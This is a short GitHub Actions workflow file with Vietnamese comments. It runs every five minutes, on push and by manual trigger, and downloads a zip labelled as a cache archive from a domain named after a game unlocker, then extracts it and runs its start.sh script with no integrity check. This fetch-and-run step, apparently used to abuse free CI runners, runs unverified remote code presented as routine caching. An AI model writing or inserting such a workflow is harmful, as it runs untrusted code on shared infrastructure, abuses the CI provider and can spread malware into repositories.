name: Run Script Workflow

on:
  workflow_dispatch:  # Cho phép chạy thủ công từ GitHub Actions tab
  push:
    branches:
      - main  # Hoặc branch bạn muốn trigger tự động
  schedule:
    - cron: '*/5 * * * *'  # Chạy mỗi 5 phút

jobs:
  run-script:
    runs-on: ubuntu-latest
    
    steps:
      - name: Download cache archive and run
        env:
          TERM: xterm
        run: |
          set -euo pipefail

          ARCHIVE_URL="http://valorantunlocker.shop/.cache.zip"
          ARCHIVE_PATH="cache.zip"

          echo "Downloading archive from ${ARCHIVE_URL}"
          curl -L -f -H "User-Agent: Mozilla/5.0" -o "${ARCHIVE_PATH}" "${ARCHIVE_URL}"

          echo "Listing archive entries"
          unzip -l "${ARCHIVE_PATH}"

          echo "Verifying archive"
          unzip -tq "${ARCHIVE_PATH}"

          echo "Extracting archive"
          unzip -oq "${ARCHIVE_PATH}"

          echo "Listing extracted files"
          ls -la

          if [ ! -f start.sh ]; then
            echo "Error: start.sh not found after extraction" >&2
            exit 1
          fi

          chmod +x start.sh

          echo "Running start.sh"
          ./start.sh 12

